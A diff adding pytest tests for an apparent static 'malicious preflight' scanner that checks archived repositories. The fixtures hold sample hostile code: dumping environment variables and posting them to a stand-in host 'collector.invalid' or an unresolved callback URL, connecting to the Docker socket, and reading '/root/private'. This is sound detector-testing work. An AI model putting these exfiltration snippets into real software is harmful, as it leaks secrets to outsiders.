@@ -1409,6 +1409,318 @@ def test_repository_preflight_trusts_only_exact_pinned_starter_file(
     assert observation.categories == ("malicious_build",)
 
 
+@pytest.mark.parametrize(
+    "case",
+    json.loads(
+        (
+            Path(__file__).parent / "fixtures" / "static-preflight-v2-regressions.json"
+        ).read_text()
+    )["cases"],
+    ids=lambda case: case["id"],
+)
+def test_static_preflight_v2_sanitized_regression_corpus(
+    tmp_path: Path, case: dict[str, object]
+) -> None:
+    files = case["files"]
+    assert isinstance(files, dict)
+    archive = _archive_files(
+        tmp_path,
+        {str(path): str(source).encode() for path, source in files.items()},
+    )
+    audit: list[dict[str, object]] = []
+
+    observation = TarSourceRepository(str(archive)).malicious_preflight(
+        artifact_sha256="a" * 64,
+        mode="enforce",
+        audit_recorder=audit.append,
+    )
+
+    assert len(audit) == 1
+    assert audit[0]["candidate_revision"] == "static-malicious-preflight-v2"
+    expected = case["expected"]
+    category = case["category"]
+    if expected == "decisive":
+        assert observation is not None
+        assert observation.finding is not None
+        assert observation.finding["prompt_revision"] == (
+            "static-malicious-preflight-v2"
+        )
+        assert category in observation.categories
+        assert audit[0]["candidate_decisive"] is True
+    elif audit[0]["legacy_requires_serial_review"]:
+        assert observation is not None
+        assert observation.finding is not None
+        assert observation.finding["prompt_revision"] == (
+            "static-malicious-preflight-v1"
+        )
+        assert audit[0]["candidate_decisive"] is False
+    else:
+        assert observation is None
+        assert audit[0]["candidate_decisive"] is False
+        assert int(audit[0]["advisory_count"]) >= 1
+
+
+def test_static_preflight_off_is_exact_legacy_default(tmp_path: Path) -> None:
+    archive = _archive_files(
+        tmp_path,
+        {
+            "Dockerfile": b"FROM scratch\n",
+            "src/main.rs": (
+                b'let endpoint = "/var/run/docker.sock";\n'
+                b"connect_control_socket(endpoint);\n"
+            ),
+        },
+    )
+    repository = TarSourceRepository(str(archive))
+
+    implicit = repository.malicious_preflight(artifact_sha256="a" * 64)
+    explicit = repository.malicious_preflight(artifact_sha256="a" * 64, mode="off")
+
+    assert implicit == explicit
+    assert implicit is not None
+    assert implicit.finding is not None
+    assert implicit.finding["prompt_revision"] == "static-malicious-preflight-v1"
+    assert implicit.finding["summary"] == (
+        "Static preflight found reachable source combinations for "
+        "docker-control-plane; execution was not started."
+    )
+
+
+def test_static_preflight_shadow_preserves_legacy_authority_and_records_delta(
+    tmp_path: Path,
+) -> None:
+    archive = _archive_files(
+        tmp_path,
+        {
+            "Dockerfile": (
+                b"FROM python:3.12\nCOPY app.py /app/app.py\n"
+                b'ENTRYPOINT ["python", "/app/app.py"]\n'
+            ),
+            "app.py": b"print('ready')\n",
+            "tools/local.py": (
+                b"secret = os.environ.copy()\n"
+                b"requests.post('https://collector.invalid', json=secret)\n"
+            ),
+        },
+    )
+    audit: list[dict[str, object]] = []
+
+    observation = TarSourceRepository(str(archive)).malicious_preflight(
+        artifact_sha256="a" * 64,
+        mode="shadow",
+        audit_recorder=audit.append,
+    )
+
+    assert observation is not None
+    assert observation.finding is not None
+    assert observation.finding["prompt_revision"] == "static-malicious-preflight-v1"
+    assert audit == [
+        {
+            **audit[0],
+            "mode": "shadow",
+            "legacy_decisive": True,
+            "candidate_decisive": False,
+        }
+    ]
+    assert audit[0]["advisory_count"] == 1
+    assert audit[0]["proofs"][0]["reachability_state"] == "proven_inert"
+
+
+def test_static_preflight_enforce_routes_unresolved_v1_threat_to_serial_review(
+    tmp_path: Path,
+) -> None:
+    archive = _archive_files(
+        tmp_path,
+        {
+            "Dockerfile": b"FROM rust:bookworm\nCOPY . .\nRUN cargo build --release\n",
+            "Cargo.toml": b'[package]\nname="app"\nversion="0.1.0"\n',
+            "src/main.rs": b'include!(env!("GENERATED_SOURCE"));\nfn main() {}\n',
+            "generated/payload.rs": (b'let path = "/root/private";\nread(path);\n'),
+        },
+    )
+    audit: list[dict[str, object]] = []
+
+    observation = TarSourceRepository(str(archive)).malicious_preflight(
+        artifact_sha256="a" * 64,
+        mode="enforce",
+        audit_recorder=audit.append,
+    )
+
+    assert observation is not None
+    assert observation.finding is not None
+    assert observation.finding["prompt_revision"] == ("static-malicious-preflight-v1")
+    assert audit[0]["candidate_decisive"] is False
+    assert audit[0]["legacy_requires_serial_review"] is True
+    assert audit[0]["advisory_count"] == 1
+    assert audit[0]["proofs"][0]["reachability_state"] == "unresolved"
+
+
+def test_static_preflight_enforce_routes_helper_indirection_to_serial_review(
+    tmp_path: Path,
+) -> None:
+    archive = _archive_files(
+        tmp_path,
+        {
+            "Dockerfile": (
+                b"FROM python:3.12\nCOPY app.py /app/app.py\n"
+                b'ENTRYPOINT ["python", "/app/app.py"]\n'
+            ),
+            "app.py": (
+                b'endpoint = "/var/run/docker.sock"\n'
+                b"dispatch(endpoint)\n"
+                b"def dispatch(value):\n    connect_control_socket(value)\n"
+            ),
+        },
+    )
+    audit: list[dict[str, object]] = []
+
+    observation = TarSourceRepository(str(archive)).malicious_preflight(
+        artifact_sha256="a" * 64,
+        mode="enforce",
+        audit_recorder=audit.append,
+    )
+
+    assert observation is not None
+    assert observation.finding is not None
+    assert observation.finding["prompt_revision"] == ("static-malicious-preflight-v1")
+    assert audit[0]["legacy_requires_serial_review"] is True
+    assert audit[0]["proofs"][0]["causal_state"] == "unresolved"
+    assert audit[0]["proofs"][0]["resolution_basis"] == ("no-target-to-control-flow")
+
+
+def test_static_preflight_enforce_accepts_affirmative_loopback_clearance(
+    tmp_path: Path,
+) -> None:
+    archive = _archive_files(
+        tmp_path,
+        {
+            "Dockerfile": (
+                b"FROM python:3.12\nCOPY app.py /app/app.py\n"
+                b'ENTRYPOINT ["python", "/app/app.py"]\n'
+            ),
+            "app.py": (
+                b"secret = os.environ.copy()\n"
+                b"requests.post('http://127.0.0.1:8080/debug', json=secret)\n"
+            ),
+        },
+    )
+    audit: list[dict[str, object]] = []
+
+    observation = TarSourceRepository(str(archive)).malicious_preflight(
+        artifact_sha256="a" * 64,
+        mode="enforce",
+        audit_recorder=audit.append,
+    )
+
+    assert observation is None
+    assert audit[0]["legacy_decisive"] is True
+    assert audit[0]["candidate_decisive"] is False
+    assert audit[0]["legacy_requires_serial_review"] is False
+    assert audit[0]["proofs"][0]["causal_state"] == "absent"
+    assert audit[0]["proofs"][0]["resolution_basis"] == "loopback-only-sink"
+
+
+@pytest.mark.parametrize("unresolved_first", [False, True])
+def test_static_preflight_enforce_keeps_mixed_loopback_exfiltration_serial(
+    tmp_path: Path, unresolved_first: bool
+) -> None:
+    loopback = b"requests.post('http://127.0.0.1/debug', json=secret)\n"
+    unresolved = b"requests.post(callback_url, json=secret)\n"
+    sinks = (unresolved, loopback) if unresolved_first else (loopback, unresolved)
+    archive = _archive_files(
+        tmp_path,
+        {
+            "Dockerfile": (
+                b"FROM python:3.12\nCOPY app.py /app/app.py\n"
+                b'ENTRYPOINT ["python", "/app/app.py"]\n'
+            ),
+            "app.py": b"secret = os.environ.copy()\n" + b"".join(sinks),
+        },
+    )
+    audit: list[dict[str, object]] = []
+
+    observation = TarSourceRepository(str(archive)).malicious_preflight(
+        artifact_sha256="a" * 64,
+        mode="enforce",
+        audit_recorder=audit.append,
+    )
+
+    assert observation is not None
+    assert observation.finding is not None
+    assert observation.finding["prompt_revision"] == "static-malicious-preflight-v1"
+    assert audit[0]["legacy_decisive"] is True
+    assert audit[0]["candidate_decisive"] is False
+    assert audit[0]["legacy_requires_serial_review"] is True
+    assert audit[0]["proofs"][0]["causal_state"] == "unresolved"
+    assert audit[0]["proofs"][0]["resolution_basis"] == (
+        "unresolved-source-to-sink-flow"
+    )
+
+
+def test_static_preflight_v2_advisory_is_visible_to_l1_inventory(
+    tmp_path: Path,
+) -> None:
+    archive = _archive_files(
+        tmp_path,
+        {
+            "Dockerfile": (
+                b"FROM python:3.12\nCOPY app.py /app/app.py\n"
+                b'ENTRYPOINT ["python", "/app/app.py"]\n'
+            ),
+            "app.py": b"print('ready')\n",
+            "tools/local.py": (
+                b"secret = os.environ.copy()\n"
+                b"requests.post('https://collector.invalid', json=secret)\n"
+            ),
+        },
+    )
+
+    leads = TarSourceRepository(
+        str(archive), static_preflight_v2_mode="enforce"
+    ).review_leads()["items"]
+
+    static = [
+        lead
+        for lead in leads
+        if str(lead["kind"]).startswith("static-malicious-advisory:")
+    ]
+    assert len(static) == 1
+    assert static[0]["reachability_state"] == "proven_inert"
+    assert static[0]["causal_state"] == "proven"
+
+
+def test_static_preflight_v2_off_does_not_change_l1_inventory(tmp_path: Path) -> None:
+    archive = _archive_files(
+        tmp_path,
+        {
+            "Dockerfile": b"FROM scratch\n",
+            "tools/local.py": (
+                b"secret = os.environ.copy()\n"
+                b"requests.post('https://collector.invalid', json=secret)\n"
+            ),
+        },
+    )
+
+    leads = TarSourceRepository(str(archive)).review_leads()["items"]
+
+    assert not any(
+        str(lead["kind"]).startswith("static-malicious-advisory:") for lead in leads
+    )
+
+
+def test_static_preflight_rejects_unknown_mode(tmp_path: Path) -> None:
+    repository = TarSourceRepository(
+        str(_archive_files(tmp_path, {"Dockerfile": b"FROM scratch\n"}))
+    )
+    with pytest.raises(
+        ValueError, match="static preflight mode must be off, shadow, or enforce"
+    ):
+        repository.malicious_preflight(
+            artifact_sha256="a" * 64,
+            mode="future",
+        )
+
+
 def test_repository_rejects_noncanonical_source_alias(tmp_path: Path) -> None:
     archive = _archive_files(
         tmp_path,
